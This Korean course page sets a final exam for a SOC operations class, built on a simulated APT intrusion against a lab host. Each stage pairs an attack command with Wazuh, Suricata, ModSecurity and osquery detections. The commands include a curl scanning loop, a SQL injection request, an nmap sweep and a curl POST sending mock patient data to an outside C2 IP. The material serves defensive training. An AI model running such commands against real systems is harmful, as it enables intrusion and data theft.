# Week 15 — 기말 — 통합 보안 아키텍처 + APT 대응 1 사이클

> 15주차 종합 평가 — APT (Advanced Persistent Threat) 시나리오에 대한 본 5종 솔루션
> + 호스트 가시화 + CTI 통합 운영. 본 시험 통과 시 secuops 과목 수료.

## 시험 규칙

- 시간: 180분 (실기 120 + 보고서 60)
- 시나리오: APT 침투 1 사이클 (Reconnaissance → Initial Access → Lateral → C2 → Exfil)
- 5 단계 × 20점 = 100점
- 본인 PC 의 학생용 6v6 환경에서 단독 진행

## APT 시나리오 (가상)

> "K-APT 그룹이 한국 의료 데이터 탈취를 목적으로 6v6 환경의 mediforum.6v6.lab 을
> 표적으로 한다. 다음 5 단계 침투 시도가 발생 — 당신은 SOC 분석가로서 5 단계 모두
> detection + 대응 + 보고."

### 단계 1 (20점) — Reconnaissance

```
ssh 6v6-attacker 'for i in {1..50}; do
  curl -s -o /dev/null -A "Mozilla/5.0" -H "Host: juice.6v6.lab" http://10.20.30.1/page-$i 
done'
```

**검출**:
- Wazuh: 404 alert (rule 31151) 빈도 → level 12 임계 도달
- Suricata: ET SCAN scanner detection
- osquery: 비정상 process (curl 의 50 회 spawn) 추적

### 단계 2 (20점) — Initial Access (SQLi 시도)

```
ssh 6v6-attacker 'curl -s -A "sqlmap" -H "Host: juice.6v6.lab" \
    "http://10.20.30.1/api?q=admin UNION SELECT user,pass FROM medical"'
```

**검출**:
- ModSec: 942100 SQLi via libinjection → 403
- Suricata: 9000xxx 사용자 정의 룰 (W04)
- Wazuh: rule 31125 (Apache 403) + CDB list (W13) → level 12

### 단계 3 (20점) — Lateral Movement

```
ssh 6v6-attacker 'timeout 3 nmap -sT -p 22,80,443 10.20.32.0/24 2>&1 | head'
```

**검출**:
- fw nftables: nft list 의 input chain log 매치
- Suricata: ET SCAN nmap detection
- osquery: nmap process spawn (process_events)

### 단계 4 (20점) — C2 Exfil 시도

```
# 가상 C2 IP 로 데이터 송신 시뮬
ssh 6v6-attacker 'curl -s -X POST -d "patient_data=PII" http://185.156.73.31:8080/ 2>&1 | head' || echo "no route"
```

**검출**:
- CDB list (W13) 의 malicious-ips 매치 → Wazuh alert level 12
- Suricata: ET CNC 룰셋 매치
- ModSec: outbound 검사 안 함 (web only)

### 단계 5 (20점) — IR 통합 보고서

다음 항목 작성:

- timeline (5 event 시간순)
- MITRE ATT&CK 매핑 (각 단계의 TTP)
- ISMS-P 2.12 sub-control 만족도
- 영향 분석 + 운영 권장 5+
- W12-14 학습한 헌팅 패턴 적용

## 평가 기준

| 점수 | 의미 |
|------|------|
| 90+ | 수료 + advanced 자격 |
| 70-89 | 수료 |
| 50-69 | 재시험 + 학기 연장 |
| 50 미만 | 재수강 |

## 마치며

본 secuops 15주 과정은 다음 5 종 솔루션 + 호스트 가시화 + CTI 의 통합 운영을 다뤘다:

1. nftables 방화벽 (W02-03)
2. Suricata IDS (W04-05)
3. Apache + ModSecurity WAF (W06)
4. osquery 호스트 가시화 (W07)
5. Wazuh SIEM (W09-10)
6. sysmon-for-linux 이벤트 (W11)
7. OpenCTI 위협 인텔리전스 (W12-14)

수료 후 SOC 분석가 / 보안 운영자로의 기본 역량 확보. 다음 단계 권장:

- 심화 SOC (course14 soc-advanced)
- 자동화 (course7 ai-security)
- 침해 대응 (course5 soc / course19 agent-ir)
